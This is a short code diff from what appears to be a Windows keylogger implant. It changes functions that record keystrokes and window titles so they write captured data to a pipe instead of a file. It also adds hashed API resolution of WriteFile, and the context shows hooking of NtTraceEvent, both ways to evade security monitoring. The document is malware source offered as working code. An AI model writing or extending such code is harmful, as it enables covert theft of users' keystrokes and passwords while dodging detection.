@@ -181,9 +181,8 @@ VOID ProcessWindowTitle()
 
             swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
 
-            //if (!WriteFile(g_FileHandle, Title, wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL)) {
-            
-            // write to PIPE
+            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL)) {
+                return 1;
         }
     }
 }
@@ -237,10 +236,9 @@ VOID ProcessKey(UINT Key)
         }
     }
 
-    // write the logged keystroke to the file 
-    //if (!WriteFile(g_FileHandle, Buffer, wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) {
-
-    // WRITE TO PIPE
+    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) {
+        return 1;
+    }
 }
 
 
@@ -334,6 +332,7 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.GetProcessHeap = (decltype(Instance->Win32.GetProcessHeap))LoadApi(Kernel32, HashStr("GetProcessHeap"));
 
     Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Kernel32, HashStr("RtlZeroMemory"));
+    Instance->Win32.WriteFile = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
 
     Instance->Hwbp.NtTraceEvent   = (PVOID)LoadApi(Ntdll, HashStr("NtTraceEvent"));
 }
